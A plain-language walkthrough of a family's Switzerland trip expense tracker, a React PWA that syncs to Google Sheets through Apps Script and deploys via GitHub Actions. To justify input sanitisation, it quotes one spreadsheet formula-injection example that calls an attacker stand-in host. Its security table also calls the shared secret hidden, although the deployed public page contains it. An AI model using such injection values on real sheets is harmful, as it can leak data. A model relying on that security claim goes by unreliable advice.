# How This App Works — A Complete Walkthrough

This document explains the Switzerland Trip Tracker from top to bottom. No prior knowledge is assumed. By the end you will understand what every file does, how data flows from your phone to Google Sheets, and how the app gets deployed.

---

## The Big Picture

Three family members (Asha, Ajit, Nishant) share one expense tracker during a trip. A friend (Hitesh) sometimes joins and shares some expenses. The app lives on everyone's phone as an icon (like a native app). When you add an expense, it immediately appears on your screen *and* gets saved to a shared Google Sheet in the background. The other two people see your entry within 30 seconds because their apps quietly check for updates every half-minute.

```
Your Phone                      Google's Servers
──────────────────────────────────────────────────────
[ App UI ]  ←──── React ────→  [ store.js ]
                                     │
                              localStorage cache
                              (works offline)
                                     │
                              fetch() HTTP calls
                                     │
                              [ Code.gs ]  ←── Google Apps Script
                                     │
                              [ Google Sheet ]
                                 ┌───────────┐
                                 │ Expenses  │
                                 │ Settings  │
                                 │ Sheet1    │
                                 └───────────┘
```

---

## The Technology Stack

Before diving into files, here is a quick glossary of the technologies used:

**HTML / CSS / JavaScript** — the three languages every web browser understands. HTML is the structure, CSS is the visual styling, JavaScript makes things interactive.

**React** — a JavaScript library made by Facebook for building user interfaces. Instead of manually updating the page when data changes, you describe *what* the UI should look like for a given state, and React figures out what to update. Think of it like a smart template.

**JSX** — a special syntax that looks like HTML inside JavaScript. React uses it. `.jsx` files contain JSX. Browsers don't understand JSX natively, so it needs to be *transpiled* (converted) into plain JavaScript first.

**Babel** — a tool that converts JSX into plain JavaScript. In this app, Babel runs *in the browser* (via a CDN script), so there is no build step needed.

**CDN** — Content Delivery Network. Instead of hosting React and Babel ourselves, we load them from `unpkg.com`, a free public server. The `integrity=` attribute on each script tag is a security checksum — if the file has been tampered with, the browser refuses to run it.

**PWA (Progressive Web App)** — a web app that can be installed on a phone like a native app. It gets its own icon, runs fullscreen, and works offline. Two things make a PWA: a `manifest.json` (describes the app) and a Service Worker (handles offline caching).

**Google Apps Script** — a JavaScript runtime that runs inside Google's servers. You write JavaScript, Google executes it. It has special objects like `SpreadsheetApp` that let you read and write Google Sheets. When deployed as a "Web App", it becomes an HTTP API endpoint — a URL you can call to run your code.

**localStorage** — a key-value store built into every browser. Data saved here survives page refreshes and browser closes. Used here as an offline cache so the app loads instantly even without internet.

**GitHub Actions** — an automation system that runs scripts whenever you push code to GitHub. Used here to deploy the app to GitHub Pages.

**GitHub Pages** — free static website hosting by GitHub. Whatever HTML/JS/CSS files are in your repo get served as a public website.

---

## File-by-File Walkthrough

### 1. `manifest.json` — What Makes It a Phone App

```json
{
  "name": "Switzerland Trip Tracker",
  "short_name": "Tracker",
  "display": "standalone",
  "start_url": "/",
  ...
}
```

This tiny file tells the browser: "this website can be installed as an app". When someone visits the site and taps "Add to Home Screen", the browser reads this file to know:
- What to name the app icon (`short_name`)
- Whether to show browser chrome or go fullscreen (`display: standalone` = fullscreen, no address bar)
- What page to open when the icon is tapped (`start_url`)
- What colour the status bar should be (`theme_color`)

Without this file, the app still works as a website but cannot be installed as an icon.

---

### 2. `sw.js` — The Offline Brain (Service Worker)

A Service Worker is a JavaScript file that runs in the background, separate from your web page. Think of it as a proxy that sits between your app and the network.

```
Browser Request  →  Service Worker  →  Network (or cache)
```

**On install** (first time the app loads):
```js
caches.open(CACHE).then(cache => cache.addAll(ASSETS))
```
The SW downloads and saves all the app's files (HTML, JS, fonts, React library) into a local cache called `swiss-tracker-v3`. This is how the app works offline.

**On every request** (each time the app needs a file):
```js
caches.match(e.request).then(cached => cached || fetch(e.request))
```
For files that belong to this app (same-origin), it serves from cache first. Only goes to the network if the file isn't cached. This makes the app load instantly — no network needed.

**When the cache version changes** (e.g. `swiss-tracker-v2` → `swiss-tracker-v3`):
The old SW is replaced, old cache is deleted, and all files are freshly downloaded. This is how updates are pushed — bump the version string in `sw.js`.

**Key lesson:** The service worker is registered in `index.html` with:
```js
navigator.serviceWorker.register('/sw.js')
```
Once registered, it stays running in the background even after you close the tab.

---

### 3. `index.html` — The Entry Point

This is the one file the browser loads first. It does four things:

**A. Sets up the page structure**
```html
<div id="root"></div>
```
This empty `div` is the container where React will inject the entire app UI.

**B. Defines configuration**
```html
<script>
  window.TRACKER_API_URL = '__TRACKER_API_URL__';
  window.TRACKER_SECRET  = '__TRACKER_SECRET__';
</script>
```
These two values are placeholders in the git repository. When the app is deployed (via GitHub Actions), `__TRACKER_API_URL__` gets replaced with the real Google Apps Script URL and `__TRACKER_SECRET__` with the real secret. Setting them on `window` makes them globally accessible to all other scripts.

**C. Loads all the scripts in order**
```html
<script src="store.js"></script>                            <!-- 1. Data layer -->
<script type="text/babel" src="tweaks-panel.jsx"></script>  <!-- 2. Settings UI -->
<script type="text/babel" src="compass-app.jsx"></script>   <!-- 3. Main UI -->
```
Order matters. `store.js` runs first because the UI files need it. Files with `type="text/babel"` are JSX — Babel (loaded from CDN earlier) intercepts these, converts the JSX to plain JavaScript, then executes them.

**D. Wires everything together**
```jsx
function App() {
  const [t, setTweak] = useTweaks(TWEAK_DEFAULTS);  // CHF rate, threshold, friend name

  // Push settings changes to the store (and Google Sheets)
  React.useEffect(() => {
    window.ExpenseStore.setSettings({
      chfRate: t.chfRate,
      warningThreshold: t.warningThreshold,
      friendName: t.friendName,
    });
  }, [t.chfRate, t.warningThreshold, t.friendName]);

  return (
    <React.Fragment>
      <CompassApp />
      <TweaksPanel title="Settings">
        {/* CHF rate slider, warning threshold slider, friend name input */}
      </TweaksPanel>
    </React.Fragment>
  );
}
ReactDOM.createRoot(document.getElementById('root')).render(<App />);
```

**The `_firstRender` ref trick:**
```js
const _firstRender = React.useRef(true);
React.useEffect(() => {
  if (_firstRender.current) { _firstRender.current = false; return; }
  window.ExpenseStore.setSettings({ chfRate: t.chfRate, ... });
}, [t.chfRate]);
```
React's `useEffect` runs after every render, including the very first one. Without this guard, loading the page would immediately overwrite the saved settings in Google Sheets with the default values. The ref skips the effect on the first render only.

---

### 4. `store.js` — The Data Brain

This is the most important file. It is a self-contained module (wrapped in an IIFE — Immediately Invoked Function Expression) that manages all data and exposes a public API via `window.ExpenseStore`.

**The IIFE pattern:**
```js
(function() {
  // everything in here is private
  // only what's assigned to window.ExpenseStore is public
  window.ExpenseStore = { ... };
})();
```
The outer `(function(){})()` creates a private scope. Variables inside cannot be accessed from outside. This prevents naming conflicts with other scripts.

**State structure:**
```js
{
  settings: {
    chfRate: 123,           // INR per CHF
    warningThreshold: 80,   // % at which the ring turns amber
    friendName: 'Hitesh',   // configurable name for the friend
  },
  entries: [
    {
      id, ts, category, person, amount, currency, amountINR, note,
      sharedWithFriend: true,   // was this split with the friend?
      paidBy: 'us',             // 'us' | 'friend'
      splitRatio: '50-50',      // '50-50' | '75-25' | '0-100' (family:friend)
    },
    ...
  ],
  fixedCosts: [ { category, budget, actual, note }, ... ],      // from Sheet1
  variableBudgets: [ { category, budget, note }, ... ],         // from Sheet1
}
```

`amountINR` is always the **full** expense amount in INR. The family's share for budget calculations is derived at render time by multiplying by the appropriate ratio — this keeps the raw data clean and backward-compatible.

**localStorage cache:**
```js
const LS_KEY = 'swiss-tracker-cache.v2';
```
On every state change, the full state is serialised to JSON and saved in localStorage. On page load, it is read back immediately. This means the app loads with data instantly, works offline, and data survives browser refresh.

**The `_emit` function — the heartbeat of state changes:**
```js
function _emit(s) {
  _state = s;           // 1. update in-memory state
  _saveCache(s);        // 2. persist to localStorage
  window.dispatchEvent(new CustomEvent('store:change', { detail: s }));  // 3. tell React
}
```
Every state change goes through `_emit`. It fires a custom browser event `store:change`. React components listening for this event re-render with the new data.

**How React listens to the store:**
```js
function useStore() {
  const [state, setState] = React.useState(_state);
  React.useEffect(() => {
    const onStoreChange = () => setState(load());
    window.addEventListener('store:change', onStoreChange);
    return () => window.removeEventListener('store:change', onStoreChange);
  }, []);
  return state;
}
```
This is a React custom hook. It creates a piece of React state and when the `store:change` event fires, it calls `setState` with the new data, triggering a React re-render. The `return () => ...` is a cleanup function that removes the listener when the component unmounts, preventing memory leaks.

**Optimistic updates:**
```js
function addEntry(entry) {
  // 1. Update local state IMMEDIATELY (user sees it instantly)
  _emit({ ..._state, entries: [newEntry, ..._state.entries] });

  // 2. Send to Google Sheets in the background
  if (API_URL) {
    _apiPost({ action: 'addEntry', entry })
      .then(_syncFromSheets)   // 3. Re-fetch to confirm
      .catch(e => { _emitSync('error'); });
  }
}
```
Step 1 happens synchronously — you see your entry immediately. Steps 2 and 3 happen asynchronously in the background. If the network call fails, the UI shows an error dot but your local data is preserved.

**Sync with Google Sheets:**
```js
async function _syncFromSheets() {
  _emitSync('syncing');
  const remote = await _apiFetch();
  _emit({ settings: remote.settings, entries: remote.entries, ... });
  _emitSync('ok');
}
```
This function is called on page load, every 30 seconds, when you switch back to the browser tab, and after every mutation to confirm the server accepted it.

**Budget summary — `summarize(state)`:**
```js
state.entries.forEach(e => {
  const ratio = !e.sharedWithFriend ? 1       // not shared → 100% family
    : e.splitRatio === '75-25' ? 0.75         // family pays 75%
    : e.splitRatio === '0-100' ? 1            // friend paid upfront, family owes all back
    : 0.5;                                    // default 50/50
  byCategory[e.category] += Math.round(e.amountINR * ratio);
});
```
For split expenses, only the family's portion counts toward the budget ring. The `0-100` (Full owe) case is special — the friend paid upfront but the family must reimburse 100%, so the full amount hits the budget.

**Friend balance — `summarizeFriend(state)`:**
```js
// positive balance = friend owes us; negative = we owe friend
if (e.splitRatio === '0-100') {
  balance -= e.amountINR;       // friend paid everything, we owe it all back
} else if (e.paidBy === 'us') {
  balance += friendShare;       // we paid, friend owes us their share
} else {
  balance -= familyShare;       // friend paid, we owe our share
}
```
Returns `{ balance, transactions, friendName }`. The balance is in INR; the UI converts to CHF for display.

**The secret in API calls:**
```js
const SECRET = window.TRACKER_SECRET || '';

// GET: appended to the URL
const url = API_URL + '?_t=' + Date.now() + '&secret=' + encodeURIComponent(SECRET);

// POST: included in the request body
body: JSON.stringify({ ...body, secret: SECRET })
```
Every request includes the shared secret. The `_t=Date.now()` cache-buster prevents Google's CDN from returning stale responses.

---

### 5. `Code.gs` — The Google Sheets Backend

This file runs on Google's servers. It is deployed as a "Web App" — a URL that accepts HTTP GET and POST requests.

**Reading the secret securely:**
```js
const SECRET = PropertiesService.getScriptProperties().getProperty('TRACKER_SECRET');
```
Instead of hardcoding the secret, it reads it from "Script Properties" — Apps Script's built-in secrets store. You set the value once through the UI; it never appears in any code file.

**The two entry points:**
```js
function doGet(e) {   // handles GET requests — reading data
  if ((e.parameter.secret || '') !== SECRET) return jsonOut({ error: 'Unauthorized' });
  return jsonOut(getState_());
}

function doPost(e) {  // handles POST requests — writing data
  const body = JSON.parse(e.postData.contents);
  if ((body.secret || '') !== SECRET) return jsonOut({ error: 'Unauthorized' });
  switch (body.action) {
    case 'addEntry':    ...
    case 'updateEntry': ...
    case 'deleteEntry': ...
    case 'setSettings': ...
  }
}
```
Both check the secret first. If it does not match, they return `Unauthorized` and do nothing.

**Reading from three sheet tabs:**
```
Sheet1      → budget structure (Fixed/Variable categories, amounts)
Expenses    → every expense entry (11 columns including split/friend fields)
Settings    → CHF rate, warning threshold, friend name
```
`getState_()` reads all three and returns one combined JSON object to the frontend.

**The Expenses tab has 11 columns:**
```
ID | Timestamp | Category | Person | Amount | Currency | Amount INR | Note | Shared | Paid By | Split
```
Old rows written before the friend-split feature was added have empty values in columns 9–11; these default safely to `false`, `'us'`, and `'50-50'` when read back.

**Input sanitization:**
```js
function sanitize_(v) {
  const s = String(v || '').trim();
  return /^[=+\-@]/.test(s) ? "'" + s : s;
}
```
Google Sheets treats any cell value starting with `=`, `+`, `-`, or `@` as a formula and executes it. A malicious note like `=IMPORTDATA("http://evil.com")` would actually run. This function prefixes such strings with a single quote, which tells Sheets to treat them as plain text.

---

### 6. `compass-app.jsx` — The User Interface

This file contains all the visible UI, written in JSX and compiled by Babel in the browser.

**Component tree:**
```
<CompassApp>                    ← root component, owns tab state
  ├── top bar (sync dot, title, budget %)
  ├── <CompassDashboard>        ← "Home" tab
  │     ├── CompassRing         ← SVG ring gauge (total spend %)
  │     ├── category bars       ← per-category variable spend
  │     ├── fixed/variable split cards
  │     └── FriendBalanceCard   ← net balance with friend (CHF + INR)
  ├── <CompassAdd>              ← "+" tab: add or edit an expense
  │     ├── amount + currency
  │     ├── category picker
  │     ├── person buttons (Asha / Ajit / Nishant / Hitesh)
  │     ├── note field
  │     └── split section       ← shown when friend is involved
  ├── <CompassHistory>          ← "History" tab
  │     ├── fixed costs section ← collapsible, shows Sheet1 fixed items
  │     └── expense entries     ← grouped by date, expand to edit/delete
  └── tab bar (Home / + / History)
```

**How `CompassApp` owns state:**
```js
function CompassApp() {
  const state   = window.ExpenseStore.useStore();        // live data from store
  const summary = window.ExpenseStore.summarize(state);  // computed totals
  const [tab, setTab]         = React.useState('home');  // which tab is visible
  const [editing, setEditing] = React.useState(null);   // entry being edited
}
```
`useStore()` returns live state and re-renders the component whenever the store emits a change. `summarize()` calculates totals and budget percentages from the raw entries.

**Friend split in CompassAdd:**

When adding or editing an expense, the payer is selected from four buttons: Asha, Ajit, Nishant, and Hitesh (the friend's name comes from `state.settings.friendName`). Selecting Hitesh automatically enables the split section. The split section shows:

- If Hitesh is paying: "Hitesh paid · how much do we owe?" with options 50/50, 75/25, or Full owe (0-100). Full owe means Hitesh paid everything and the family owes him 100% back.
- If a family member is paying: a toggle "Split with Hitesh" that reveals 50/50 or 75/25 options.

In both cases, a CHF and INR breakdown is shown live as the amount is typed.

`paidBy` is derived automatically from who is selected — no separate "who paid" toggle needed.

**FriendBalanceCard:**
```jsx
// balance > 0: friend owes us  →  green
// balance < 0: we owe friend   →  amber
// balance = 0: settled         →  grey
```
Shows the net balance as `CHF X.XX` with `₹Y` in smaller grey text below. CHF is derived by dividing the INR balance by the current CHF rate from settings.

**Fixed costs in CompassHistory:**

A collapsible section at the top of the History list (collapsed by default) shows all fixed-cost items from Sheet1 — flights, visa, Airbnb, travel card, etc. Each row shows the category, note, actual amount, and budget. Variable expense entries follow below, completely unchanged. The section header always shows the total fixed actual and item count so you can see the headline without expanding.

**The ring gauge:**
```js
const circumference = 2 * Math.PI * r;
const dash = Math.min(pct, 1) * circumference;
// <circle strokeDasharray={`${dash} ${circumference}`} />
```
Two SVG circles are drawn. The second uses `strokeDasharray` to draw only the fraction of the circle that corresponds to spending percentage. At 50% spending, exactly half the ring is filled.

**The sync status dot:**
```js
function SyncDot() {
  const status = window.ExpenseStore.useSyncStatus();
  const colors = { local: '#888', connecting: '#e3b658', syncing: '#e3b658', ok: '#7ec48a', error: '#e57565' };
  return <span style={{ background: colors[status] }} />;
}
```
A small coloured circle in the top bar. Green = synced. Yellow = syncing. Red = error. Grey = local-only mode.

**Edit and delete flow:**
Tapping an entry in History expands it to show Edit and Delete buttons. Edit calls:
```js
function startEdit(entry) { setEditing(entry); setTab('add'); }
```
This stores the entry and switches to the Add tab. `CompassAdd` detects that `editing` is set and pre-fills all form fields with the existing values, including the split/friend fields.

---

### 7. `tweaks-panel.jsx` — The Settings Drawer

A reusable floating panel that slides in when you tap the ⚙ gear button. It exposes a `useTweaks` hook (used in `index.html`) and registers `window.__toggleSettings` which the gear button calls to open/close it.

**Controls:**
- **CHF → ₹ rate** slider (80–150, step 0.5) — changing this instantly re-converts all existing CHF entries in the UI and syncs the new rate to Google Sheets
- **Warn at** slider (50–95%, step 5%) — the threshold at which the budget ring turns amber
- **Friend's name** text input — saved on blur (not on every keystroke, to avoid a race condition where intermediate values like "Hites" get synced to the sheet before "Hitesh" is fully typed)

**`TweakText` component:**
```jsx
function TweakText({ label, value, onChange, placeholder }) {
  const [local, setLocal] = React.useState(value);
  React.useEffect(() => { setLocal(value); }, [value]);  // sync from sheet
  return (
    <input
      value={local}
      onChange={e => setLocal(e.target.value)}   // update local display only
      onBlur={e => onChange(e.target.value)}     // save on focus-out
    />
  );
}
```
Local state tracks what the user types for immediate visual feedback. `onChange` (which triggers `setSettings` and an API call) only fires when the user leaves the field.

---

### 8. `.github/workflows/deploy.yml` — Automated Deployment

```yaml
on:
  push:
    branches: [main]
```
This workflow runs every time code is pushed to the `main` branch.

```yaml
- name: Inject secrets into index.html
  run: |
    sed -i "s|__TRACKER_API_URL__|${{ secrets.TRACKER_API_URL }}|g" index.html
    sed -i "s|__TRACKER_SECRET__|${{ secrets.TRACKER_SECRET }}|g"  index.html
```
`sed` is a Unix text-replacement tool. This step replaces the placeholder strings in `index.html` with the real values stored in GitHub's encrypted secrets. The repo always contains placeholders; real values only ever exist in GitHub's secrets vault and in the deployed files.

```yaml
- uses: actions/upload-pages-artifact@v3
  with:
    path: '.'
- uses: actions/deploy-pages@v4
```
These steps upload all files (with secrets injected) and publish them to GitHub Pages.

---

## The Full Data Flow — Tracing One Expense

Here is exactly what happens from the moment you tap "Add expense" to the moment the other two people see it:

```
1. You fill in the form and tap "Add expense"
   └─ CompassAdd calls window.ExpenseStore.addEntry({
        amount: 50, currency: 'CHF',
        sharedWithFriend: true, paidBy: 'us', splitRatio: '50-50', ...
      })

2. store.js creates a local entry immediately
   └─ Assigns a unique ID: 'e' + Date.now() + random string
   └─ Converts CHF → INR: 50 × 123 = ₹6,150
   └─ Calls _emit() → updates _state, saves to localStorage, fires 'store:change' event

3. React sees the event and re-renders
   └─ Your new entry appears in the History tab instantly
   └─ The ring gauge updates (family pays 50% → ₹3,075 hits the category)
   └─ The FriendBalanceCard updates (friend owes us ₹3,075 more)

4. In the background, store.js calls _apiPost({ action: 'addEntry', entry, secret })
   └─ HTTP POST to the Google Apps Script URL
   └─ Travels over HTTPS to Google's servers

5. Code.gs receives the POST
   └─ Checks the secret matches Script Properties → passes
   └─ Sanitizes the note and category fields
   └─ Appends a new row to the Expenses tab (all 11 columns)
   └─ Returns { ok: true, id }

6. store.js receives the success response
   └─ Calls _syncFromSheets() to get the canonical server state
   └─ Re-fetches everything from Sheets (GET request)
   └─ Calls _emit() again with the server's response
   └─ Sync dot turns green

7. On Asha's phone (within 30 seconds)
   └─ The setInterval fires _syncFromSheets()
   └─ GET request fetches the full state including your new entry
   └─ _emit() fires, React re-renders, she sees your expense
```

---

## Security Model

| Layer | Mechanism |
|-------|-----------|
| API URL hidden from repo | GitHub Actions injects it at deploy time |
| Secret hidden from repo | GitHub Actions injects it; stored in Script Properties on backend |
| Requests authenticated | Every request includes the secret; backend rejects requests without it |
| Sheet formula injection | `sanitize_()` prefixes dangerous characters with a single quote |
| CDN scripts verified | `integrity=` SRI hashes on React and Babel script tags |

---

## How to Make Changes

**Change a budget amount** → Edit it directly in Sheet1. The app picks it up on next sync (within 30 seconds).

**Add a new expense category** → Add a row to Sheet1 with type `Variable`. App picks it up on next sync.

**Change the CHF rate** → Use the ⚙ settings panel in the app. It saves to the Settings tab in Sheets and instantly re-converts all CHF entries in the UI.

**Change the friend's name** → Use the ⚙ settings panel → "Friend's name" field. Type the name and tap/click away to save. It syncs to all devices within 30 seconds.

**Change the app code** → Edit files locally, `git push`. GitHub Actions redeploys automatically in ~60 seconds.

**Update the secret** → Generate a new one, update in GitHub repo secrets AND Apps Script Script Properties, then push an empty commit to trigger redeployment:
```bash
git commit --allow-empty -m "rotate secret"
git push
```

**Bump the service worker cache** → When deploying changes to any cached file, increment the cache version string in `sw.js` (e.g. `swiss-tracker-v3` → `swiss-tracker-v4`). This forces all installed apps to download fresh files on next load.
